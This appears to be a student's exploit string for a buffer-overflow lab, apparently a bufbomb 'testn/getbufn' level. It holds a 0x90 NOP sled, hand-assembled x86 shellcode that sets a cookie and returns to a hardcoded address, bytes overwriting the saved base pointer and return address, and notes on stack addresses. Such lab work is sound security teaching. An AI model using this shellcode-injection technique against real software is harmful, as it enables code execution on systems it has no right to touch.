90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128byte nops */ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128byte nops */ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128byte nops */ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128byte nops */ 
e8 00 00 00 00       	/* 0 call   next line */
58                   	/* 5 pop    %eax	*/
8d 68 3f             	/* 6 lea    0x3f(%eax),%ebp */
b8 4e d7 5b 5f       	/* 9 mov    $0x5f5bd74e,%eax */ 
68 93 8c 04 08       	/* e push   $0x8048c93 */  
c3                   	/* 13 ret	*/ 
d0 3a 68 55 			/* ebp @ ?, recover testn ebp=? +- const? */   
a0 39 68 55 			/* return address @ebp+4, make it to ebp-0x100 = ? */    



  /*
ebp
0x55683ad0 0x55683aa0 0x55682f90
*ebp
0x55683b00 0x55683ad0 0x55682fc0

look at the paterns
the ebp@testn to ebp@getbufn
forwarded by exactly 0x30
once I got they excuated my code ,i have access to $eip,then i have ebp@bufn,hence the ebp@testn
ebp@testn = $eip+offset+0x30
  

  wrong..eip not directly asscessable

   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	b8 4e d7 5b 5f       	mov    $0x5f5bd74e,%eax
   9:	68 c1 8d 04 08       	push   $0x8048dc1
   e:	c3                   	ret    

  */